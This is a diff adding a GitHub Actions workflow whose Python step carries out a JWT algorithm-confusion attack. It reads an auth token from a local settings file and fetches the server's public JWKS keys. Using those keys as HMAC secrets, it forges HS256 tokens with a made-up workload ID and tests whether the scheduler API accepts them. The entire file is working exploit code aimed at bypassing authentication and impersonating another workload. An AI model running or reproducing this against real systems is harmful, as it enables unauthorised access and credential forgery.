@@ -1,0 +1,62 @@
+name: probe_v72_algconf
+on:
+  workflow_dispatch:
+jobs:
+  algconf:
+    runs-on: ubuntu-latest
+    steps:
+      - name: alg-confusion-checkbox
+        continue-on-error: true
+        run: |
+          python3 - <<'PYEOF'
+          import json, base64, hmac, hashlib, urllib.request, urllib.error, uuid
+
+          s = json.load(open('/opt/hca/.settings'))
+          tok   = s['authToken']; sched = s['schedulerApiUrl']
+          host  = sched.split('//')[0]+'//'+sched.split('//')[1].split('/')[0]
+
+          def b64u(b):
+              if isinstance(b,str): b=b.encode()
+              return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+          def b64ud(x):
+              x+='='*(-len(x)%4); return base64.urlsafe_b64decode(x)
+
+          hdr=json.loads(b64ud(tok.split('.')[0])); claims=json.loads(b64ud(tok.split('.')[1]))
+          real_kid=hdr.get('kid'); real_wid=claims.get('wid','')
+          parts=real_wid.split(':')
+          forged_wid=(parts[0]+':'+str(uuid.uuid4())+':'+str(uuid.uuid4())) if len(parts)==3 else str(uuid.uuid4())
+
+          # fetch full JWKS (public verification keys)
+          jwks={}
+          try:
+              jwks=json.loads(urllib.request.urlopen(host+'/.well-known/jwks',timeout=10).read().decode())
+          except Exception as e:
+              print('JWKS_FETCH_ERR='+str(e))
+          keys=jwks.get('keys',[])
+          print('JWKS_KIDS='+str([k.get('kid') for k in keys]))
+          print('REAL_TOKEN_KID='+str(real_kid))
+
+          def oracle(label, token):
+              r=urllib.request.Request(sched+'/request',method='GET'); r.add_header('Authorization','Bearer '+token)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=15); st=resp.status; body=resp.read(200).decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  st=e.code; body=e.read(220).decode('utf-8','replace')
+              except Exception as e:
+                  st='ERR'; body=str(e)
+              verdict='**CONFUSION-ACCEPTED**' if st not in (401,'ERR') else 'refute'
+              print('V5[%s] -> %s %s | %s' % (label, st, verdict, body[:160].replace(chr(10),' ')))
+
+          # For each published key, HS256-sign with the raw pubkey bytes / b64 / jwk-json as HMAC secret
+          for k in keys:
+              kid=k.get('kid'); x=k.get('x','')
+              try: rawpub=b64ud(x)
+              except Exception: rawpub=b''
+              secrets={'raw32':rawpub,'b64url_x':x.encode(),'jwk_json':json.dumps(k,separators=(',',':')).encode()}
+              for sname,secret in secrets.items():
+                  fh={'alg':'HS256','typ':'JWT','kid':kid}; fc=dict(claims); fc['wid']=forged_wid
+                  signing=b64u(json.dumps(fh,separators=(',',':')))+'.'+b64u(json.dumps(fc,separators=(',',':')))
+                  s_=hmac.new(secret,signing.encode(),hashlib.sha256).digest()
+                  oracle('kid=%s secret=%s' % (kid,sname), signing+'.'+b64u(s_))
+          print('=== DONE ===')
+          PYEOF
